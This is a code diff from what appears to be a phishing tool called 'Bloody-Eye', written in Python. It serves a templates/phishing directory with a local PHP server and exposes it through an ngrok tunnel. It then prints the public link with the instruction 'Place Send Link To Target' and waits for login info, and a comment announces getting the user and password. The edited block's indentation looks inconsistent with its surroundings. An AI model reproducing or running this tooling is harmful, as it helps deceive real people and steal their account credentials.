@@ -9,9 +9,9 @@ from pyngrok import ngrok
 import json
 from modules import bannner
 import time
-with open("config.json","r") as read_file:
-   data = json.load(read_file)
-   token = data["ngrok11"]
+with open("config.json", "r") as read_file:
+    data = json.load(read_file)
+    token = data["ngrok"]
 
 
 stat_file = 0
@@ -556,15 +556,11 @@ exit();""")
     elif v == "02":
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print("")
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      global token
-      link = ngrok.connect(6060,"http",auth_token=token)
-      a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
-      b_print_link = (a_print_link).replace("http","https")
-      print("\n"+b_print_link)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url2 : "+link)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.WHITE+" Waiting for Login Info. "+Fore.BLUE+"Ctrl + C "+Fore.WHITE+"to exit")
+    banner.banner()
+    global token
+    a = ngrok.connect(4545,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
 
     
 # Getting User And Password
